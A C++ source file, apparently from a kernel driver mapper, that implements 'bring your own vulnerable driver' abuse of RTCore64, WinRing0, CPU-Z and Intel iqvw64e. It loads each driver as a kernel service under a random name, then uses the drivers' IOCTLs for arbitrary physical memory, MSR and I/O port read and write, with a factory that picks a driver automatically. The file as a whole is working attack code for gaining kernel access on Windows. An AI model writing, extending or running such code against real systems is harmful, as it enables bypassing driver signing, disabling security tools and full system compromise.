/*
 * Vulnerable Driver Implementations
 * Support for multiple BYOVD drivers
 */

#include "vulnerable_drivers.hpp"
#include <filesystem>
#include <random>
#include <tchar.h>

#pragma warning(disable: 4996) // _CRT_SECURE_NO_WARNINGS

namespace mapper {
namespace drivers {

// ============================================
// Helper Functions
// ============================================

namespace {

std::wstring GenerateRandomServiceName(const wchar_t* prefix) {
    static const wchar_t charset[] = L"abcdefghijklmnopqrstuvwxyz0123456789";
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dist(0, (int)wcslen(charset) - 1);
    
    std::wstring name(prefix);
    for (int i = 0; i < 8; ++i) {
        name += charset[dist(gen)];
    }
    return name;
}

bool EnableLoadDriverPrivilege() {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        return false;
    }
    
    TOKEN_PRIVILEGES tp;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    
    if (!LookupPrivilegeValue(NULL, SE_LOAD_DRIVER_NAME, &tp.Privileges[0].Luid)) {
        CloseHandle(hToken);
        return false;
    }
    
    BOOL result = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    DWORD error = GetLastError();
    
    CloseHandle(hToken);
    return result && error == ERROR_SUCCESS;
}

bool CreateDriverServiceInternal(
    const std::wstring& serviceName,
    const std::wstring& displayName,
    const std::wstring& driverPath
) {
    SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!scm) return false;
    
    SC_HANDLE service = CreateServiceW(
        scm,
        serviceName.c_str(),
        displayName.c_str(),
        SERVICE_ALL_ACCESS,
        SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE,
        driverPath.c_str(),
        NULL, NULL, NULL, NULL, NULL
    );
    
    if (!service) {
        service = OpenServiceW(scm, serviceName.c_str(), SERVICE_ALL_ACCESS);
    }
    
    bool success = (service != NULL);
    
    if (service) {
        StartServiceW(service, 0, NULL);
        CloseServiceHandle(service);
    }
    CloseServiceHandle(scm);
    
    return success;
}

bool DeleteDriverServiceInternal(const std::wstring& serviceName) {
    SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (!scm) return false;
    
    SC_HANDLE service = OpenServiceW(scm, serviceName.c_str(), SERVICE_ALL_ACCESS);
    if (!service) {
        CloseServiceHandle(scm);
        return true;
    }
    
    SERVICE_STATUS status;
    ControlService(service, SERVICE_CONTROL_STOP, &status);
    
    bool success = DeleteService(service) != FALSE;
    
    CloseServiceHandle(service);
    CloseServiceHandle(scm);
    
    return success;
}

} // anonymous namespace

// ============================================
// RTCore64 Driver Implementation
// ============================================

bool RTCore64Driver::Initialize(const std::wstring& driverPath) {
    if (!std::filesystem::exists(driverPath)) {
        return false;
    }
    m_driverPath = driverPath;
    m_serviceName = GenerateRandomServiceName(L"rtc");
    return true;
}

bool RTCore64Driver::Load() {
    if (!EnableLoadDriverPrivilege()) {
        return false;
    }
    
    if (!CreateService()) {
        return false;
    }
    
    m_hDevice = CreateFileA(
        GetDeviceName(),
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    
    if (m_hDevice == INVALID_HANDLE_VALUE) {
        DeleteService();
        return false;
    }
    
    return true;
}

bool RTCore64Driver::Unload() {
    if (m_hDevice != INVALID_HANDLE_VALUE) {
        CloseHandle(m_hDevice);
        m_hDevice = INVALID_HANDLE_VALUE;
    }
    return DeleteService();
}

void RTCore64Driver::Cleanup() {
    Unload();
}

bool RTCore64Driver::CreateService() {
    return CreateDriverServiceInternal(m_serviceName, m_serviceName, m_driverPath);
}

bool RTCore64Driver::DeleteService() {
    return DeleteDriverServiceInternal(m_serviceName);
}

MemoryOpResult RTCore64Driver::ReadPhysicalMemory(uint64_t address, void* buffer, size_t size) {
    if (m_hDevice == INVALID_HANDLE_VALUE) {
        return MemoryOpResult::Error(1, "Device not open");
    }
    
    // RTCore reads in 4-byte chunks
    uint8_t* dst = (uint8_t*)buffer;
    uint64_t currentAddr = address;
    size_t remaining = size;
    
    while (remaining > 0) {
        RTCORE_MEMORY memReq = {};
        memReq.Address = currentAddr;
        memReq.ReadSize = remaining >= 4 ? 4 : (uint32_t)remaining;
        
        DWORD bytesReturned;
        if (!DeviceIoControl(
            m_hDevice,
            RTCORE_MEMORY_READ,
            &memReq,
            sizeof(memReq),
            &memReq,
            sizeof(memReq),
            &bytesReturned,
            NULL
        )) {
            return MemoryOpResult::Error(GetLastError(), "DeviceIoControl failed");
        }
        
        memcpy(dst, &memReq.Value, memReq.ReadSize);
        
        dst += memReq.ReadSize;
        currentAddr += memReq.ReadSize;
        remaining -= memReq.ReadSize;
    }
    
    return MemoryOpResult::Success((uint32_t)size);
}

MemoryOpResult RTCore64Driver::WritePhysicalMemory(uint64_t address, const void* buffer, size_t size) {
    if (m_hDevice == INVALID_HANDLE_VALUE) {
        return MemoryOpResult::Error(1, "Device not open");
    }
    
    const uint8_t* src = (const uint8_t*)buffer;
    uint64_t currentAddr = address;
    size_t remaining = size;
    
    while (remaining > 0) {
        RTCORE_MEMORY memReq = {};
        memReq.Address = currentAddr;
        memReq.ReadSize = remaining >= 4 ? 4 : (uint32_t)remaining;
        memcpy(&memReq.Value, src, memReq.ReadSize);
        
        DWORD bytesReturned;
        if (!DeviceIoControl(
            m_hDevice,
            RTCORE_MEMORY_WRITE,
            &memReq,
            sizeof(memReq),
            &memReq,
            sizeof(memReq),
            &bytesReturned,
            NULL
        )) {
            return MemoryOpResult::Error(GetLastError(), "DeviceIoControl failed");
        }
        
        src += memReq.ReadSize;
        currentAddr += memReq.ReadSize;
        remaining -= memReq.ReadSize;
    }
    
    return MemoryOpResult::Success((uint32_t)size);
}

bool RTCore64Driver::ReadMSR(uint32_t msr, uint64_t* value) {
    if (m_hDevice == INVALID_HANDLE_VALUE || !value) return false;
    
    RTCORE_MSR msrReq = {};
    msrReq.Register = msr;
    
    DWORD bytesReturned;
    if (!DeviceIoControl(
        m_hDevice,
        RTCORE_MSR_READ,
        &msrReq,
        sizeof(msrReq),
        &msrReq,
        sizeof(msrReq),
        &bytesReturned,
        NULL
    )) {
        return false;
    }
    
    *value = msrReq.Value;
    return true;
}

bool RTCore64Driver::WriteMSR(uint32_t msr, uint64_t value) {
    if (m_hDevice == INVALID_HANDLE_VALUE) return false;
    
    RTCORE_MSR msrReq = {};
    msrReq.Register = msr;
    msrReq.Value = value;
    
    DWORD bytesReturned;
    return DeviceIoControl(
        m_hDevice,
        RTCORE_MSR_WRITE,
        &msrReq,
        sizeof(msrReq),
        &msrReq,
        sizeof(msrReq),
        &bytesReturned,
        NULL
    ) != FALSE;
}

// ============================================
// WinRing0 Driver Implementation
// ============================================

bool WinRing0Driver::Initialize(const std::wstring& driverPath) {
    if (!std::filesystem::exists(driverPath)) {
        return false;
    }
    m_driverPath = driverPath;
    m_serviceName = GenerateRandomServiceName(L"wr0");
    return true;
}

bool WinRing0Driver::Load() {
    if (!EnableLoadDriverPrivilege()) {
        return false;
    }
    
    if (!CreateService()) {
        return false;
    }
    
    m_hDevice = CreateFileA(
        GetDeviceName(),
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    
    if (m_hDevice == INVALID_HANDLE_VALUE) {
        DeleteService();
        return false;
    }
    
    return true;
}

bool WinRing0Driver::Unload() {
    if (m_hDevice != INVALID_HANDLE_VALUE) {
        CloseHandle(m_hDevice);
        m_hDevice = INVALID_HANDLE_VALUE;
    }
    return DeleteService();
}

void WinRing0Driver::Cleanup() {
    Unload();
}

bool WinRing0Driver::CreateService() {
    return CreateDriverServiceInternal(m_serviceName, m_serviceName, m_driverPath);
}

bool WinRing0Driver::DeleteService() {
    return DeleteDriverServiceInternal(m_serviceName);
}

MemoryOpResult WinRing0Driver::ReadPhysicalMemory(uint64_t address, void* buffer, size_t size) {
    if (m_hDevice == INVALID_HANDLE_VALUE) {
        return MemoryOpResult::Error(1, "Device not open");
    }
    
    OLS_READ_MEMORY readReq = {};
    readReq.Address = address;
    readReq.UnitSize = 1;
    readReq.Count = (uint32_t)size;
    
    DWORD bytesReturned;
    if (!DeviceIoControl(
        m_hDevice,
        IOCTL_OLS_READ_MEMORY,
        &readReq,
        sizeof(readReq),
        buffer,
        (DWORD)size,
        &bytesReturned,
        NULL
    )) {
        return MemoryOpResult::Error(GetLastError(), "DeviceIoControl failed");
    }
    
    return MemoryOpResult::Success(bytesReturned);
}

MemoryOpResult WinRing0Driver::WritePhysicalMemory(uint64_t address, const void* buffer, size_t size) {
    if (m_hDevice == INVALID_HANDLE_VALUE) {
        return MemoryOpResult::Error(1, "Device not open");
    }
    
    // Allocate buffer for request + data
    std::vector<uint8_t> reqBuffer(sizeof(OLS_WRITE_MEMORY) - 1 + size);
    auto* writeReq = (OLS_WRITE_MEMORY*)reqBuffer.data();
    
    writeReq->Address = address;
    writeReq->UnitSize = 1;
    writeReq->Count = (uint32_t)size;
    memcpy(writeReq->Data, buffer, size);
    
    DWORD bytesReturned;
    if (!DeviceIoControl(
        m_hDevice,
        IOCTL_OLS_WRITE_MEMORY,
        reqBuffer.data(),
        (DWORD)reqBuffer.size(),
        NULL,
        0,
        &bytesReturned,
        NULL
    )) {
        return MemoryOpResult::Error(GetLastError(), "DeviceIoControl failed");
    }
    
    return MemoryOpResult::Success((uint32_t)size);
}

MemoryOpResult WinRing0Driver::MapPhysicalMemory(uint64_t address, size_t size, void** mapped) {
    // WinRing0 doesn't have direct mapping, use read/write instead
    (void)address;
    (void)size;
    (void)mapped;
    return MemoryOpResult::Error(1, "Mapping not supported");
}

void WinRing0Driver::UnmapPhysicalMemory(void* mapped) {
    (void)mapped;
}

bool WinRing0Driver::ReadMSR(uint32_t msr, uint64_t* value) {
    if (m_hDevice == INVALID_HANDLE_VALUE || !value) return false;
    
    DWORD bytesReturned;
    uint64_t result = 0;
    
    if (!DeviceIoControl(
        m_hDevice,
        IOCTL_OLS_READ_MSR,
        &msr,
        sizeof(msr),
        &result,
        sizeof(result),
        &bytesReturned,
        NULL
    )) {
        return false;
    }
    
    *value = result;
    return true;
}

bool WinRing0Driver::WriteMSR(uint32_t msr, uint64_t value) {
    if (m_hDevice == INVALID_HANDLE_VALUE) return false;
    
    struct {
        uint32_t msr;
        uint32_t reserved;
        uint64_t value;
    } msrReq = { msr, 0, value };
    
    DWORD bytesReturned;
    return DeviceIoControl(
        m_hDevice,
        IOCTL_OLS_WRITE_MSR,
        &msrReq,
        sizeof(msrReq),
        NULL,
        0,
        &bytesReturned,
        NULL
    ) != FALSE;
}

bool WinRing0Driver::ReadIOPort(uint16_t port, uint32_t* value, uint8_t size) {
    if (m_hDevice == INVALID_HANDLE_VALUE || !value) return false;
    
    (void)size; // WinRing0 reads bytes only with this IOCTL
    
    DWORD bytesReturned;
    uint8_t result = 0;
    
    if (!DeviceIoControl(
        m_hDevice,
        IOCTL_OLS_READ_IO_PORT_BYTE,
        &port,
        sizeof(port),
        &result,
        sizeof(result),
        &bytesReturned,
        NULL
    )) {
        return false;
    }
    
    *value = result;
    return true;
}

bool WinRing0Driver::WriteIOPort(uint16_t port, uint32_t value, uint8_t size) {
    if (m_hDevice == INVALID_HANDLE_VALUE) return false;
    
    (void)size; // WinRing0 writes bytes only
    
    struct {
        uint16_t port;
        uint8_t value;
    } portReq = { port, (uint8_t)value };
    
    DWORD bytesReturned;
    return DeviceIoControl(
        m_hDevice,
        IOCTL_OLS_WRITE_IO_PORT_BYTE,
        &portReq,
        sizeof(portReq),
        NULL,
        0,
        &bytesReturned,
        NULL
    ) != FALSE;
}

// ============================================
// CPUZ Driver Implementation
// ============================================

bool CpuzDriver::Initialize(const std::wstring& driverPath) {
    if (!std::filesystem::exists(driverPath)) {
        return false;
    }
    m_driverPath = driverPath;
    m_serviceName = GenerateRandomServiceName(L"cpuz");
    return true;
}

bool CpuzDriver::Load() {
    if (!EnableLoadDriverPrivilege()) {
        return false;
    }
    
    if (!CreateService()) {
        return false;
    }
    
    m_hDevice = CreateFileA(
        GetDeviceName(),
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    
    if (m_hDevice == INVALID_HANDLE_VALUE) {
        DeleteService();
        return false;
    }
    
    return true;
}

bool CpuzDriver::Unload() {
    if (m_hDevice != INVALID_HANDLE_VALUE) {
        CloseHandle(m_hDevice);
        m_hDevice = INVALID_HANDLE_VALUE;
    }
    return DeleteService();
}

void CpuzDriver::Cleanup() {
    Unload();
}

bool CpuzDriver::CreateService() {
    return CreateDriverServiceInternal(m_serviceName, m_serviceName, m_driverPath);
}

bool CpuzDriver::DeleteService() {
    return DeleteDriverServiceInternal(m_serviceName);
}

MemoryOpResult CpuzDriver::ReadPhysicalMemory(uint64_t address, void* buffer, size_t size) {
    void* mapped = nullptr;
    auto mapResult = MapPhysicalMemory(address, size, &mapped);
    
    if (!mapResult.success) {
        return mapResult;
    }
    
    memcpy(buffer, mapped, size);
    UnmapPhysicalMemory(mapped);
    
    return MemoryOpResult::Success((uint32_t)size);
}

MemoryOpResult CpuzDriver::WritePhysicalMemory(uint64_t address, const void* buffer, size_t size) {
    void* mapped = nullptr;
    auto mapResult = MapPhysicalMemory(address, size, &mapped);
    
    if (!mapResult.success) {
        return mapResult;
    }
    
    memcpy(mapped, buffer, size);
    UnmapPhysicalMemory(mapped);
    
    return MemoryOpResult::Success((uint32_t)size);
}

MemoryOpResult CpuzDriver::MapPhysicalMemory(uint64_t address, size_t size, void** mapped) {
    if (m_hDevice == INVALID_HANDLE_VALUE) {
        return MemoryOpResult::Error(1, "Device not open");
    }
    
    CPUZ_MAP_INPUT input = {};
    input.PhysicalAddress = address;
    input.Size = (uint32_t)size;
    
    CPUZ_MAP_OUTPUT output = {};
    
    DWORD bytesReturned;
    if (!DeviceIoControl(
        m_hDevice,
        CPUZ_MAP_PHYSICAL,
        &input,
        sizeof(input),
        &output,
        sizeof(output),
        &bytesReturned,
        NULL
    )) {
        return MemoryOpResult::Error(GetLastError(), "Map failed");
    }
    
    *mapped = (void*)output.VirtualAddress;
    return MemoryOpResult::Success((uint32_t)size);
}

void CpuzDriver::UnmapPhysicalMemory(void* mapped) {
    if (m_hDevice == INVALID_HANDLE_VALUE || !mapped) return;
    
    DWORD bytesReturned;
    DeviceIoControl(
        m_hDevice,
        CPUZ_UNMAP_PHYSICAL,
        &mapped,
        sizeof(mapped),
        NULL,
        0,
        &bytesReturned,
        NULL
    );
}

// ============================================
// Driver Factory
// ============================================

std::unique_ptr<IVulnerableDriver> DriverFactory::Create(DriverType type) {
    switch (type) {
        case DriverType::MSI_RTCore64:
            return std::make_unique<RTCore64Driver>();
        case DriverType::WinRing0:
            return std::make_unique<WinRing0Driver>();
        case DriverType::CPUZ_146:
            return std::make_unique<CpuzDriver>();
        case DriverType::Intel_iqvw64e:
            // Use IntelDriver from driver_mapper.hpp
            return nullptr; // Handle separately
        default:
            return nullptr;
    }
}

std::unique_ptr<IVulnerableDriver> DriverFactory::AutoDetect() {
    // Try each driver type in order of preference
    std::vector<DriverType> types = {
        DriverType::Intel_iqvw64e,
        DriverType::MSI_RTCore64,
        DriverType::WinRing0,
        DriverType::CPUZ_146
    };
    
    for (auto type : types) {
        auto driver = Create(type);
        if (driver) {
            return driver;
        }
    }
    
    return nullptr;
}

std::vector<DriverType> DriverFactory::GetSupportedDrivers() {
    return {
        DriverType::Intel_iqvw64e,
        DriverType::MSI_RTCore64,
        DriverType::WinRing0,
        DriverType::CPUZ_146
    };
}

bool DriverFactory::ValidateDriverFile(const std::wstring& path, DriverType& detectedType) {
    detectedType = DriverType::Unknown;
    
    if (!std::filesystem::exists(path)) {
        return false;
    }
    
    // Get filename
    std::wstring filename = std::filesystem::path(path).filename().wstring();
    
    // Match by filename
    if (filename.find(L"iqvw64e") != std::wstring::npos ||
        filename.find(L"iqvw64") != std::wstring::npos) {
        detectedType = DriverType::Intel_iqvw64e;
    }
    else if (filename.find(L"RTCore64") != std::wstring::npos ||
             filename.find(L"rtcore") != std::wstring::npos) {
        detectedType = DriverType::MSI_RTCore64;
    }
    else if (filename.find(L"WinRing0") != std::wstring::npos) {
        detectedType = DriverType::WinRing0;
    }
    else if (filename.find(L"cpuz") != std::wstring::npos) {
        detectedType = DriverType::CPUZ_146;
    }
    
    return detectedType != DriverType::Unknown;
}

// ============================================
// Driver Manager Implementation
// ============================================

DriverManager::~DriverManager() {
    Cleanup();
}

bool DriverManager::Initialize(DriverType preferred) {
    m_driver = DriverFactory::Create(preferred);
    return m_driver != nullptr;
}

bool DriverManager::Initialize(const std::wstring& driverPath) {
    DriverType type;
    if (!DriverFactory::ValidateDriverFile(driverPath, type)) {
        return false;
    }
    
    m_driver = DriverFactory::Create(type);
    if (!m_driver) {
        return false;
    }
    
    if (!m_driver->Initialize(driverPath)) {
        m_driver.reset();
        return false;
    }
    
    if (!m_driver->Load()) {
        m_driver.reset();
        return false;
    }
    
    m_driverPath = driverPath;
    m_ownsDriver = true;
    return true;
}

bool DriverManager::ReadPhysical(uint64_t address, void* buffer, size_t size) {
    if (!m_driver || !m_driver->IsLoaded()) return false;
    return m_driver->ReadPhysicalMemory(address, buffer, size).success;
}

bool DriverManager::WritePhysical(uint64_t address, const void* buffer, size_t size) {
    if (!m_driver || !m_driver->IsLoaded()) return false;
    return m_driver->WritePhysicalMemory(address, buffer, size).success;
}

void DriverManager::Cleanup() {
    if (m_driver) {
        m_driver->Cleanup();
        m_driver.reset();
    }
}

} // namespace drivers
} // namespace mapper

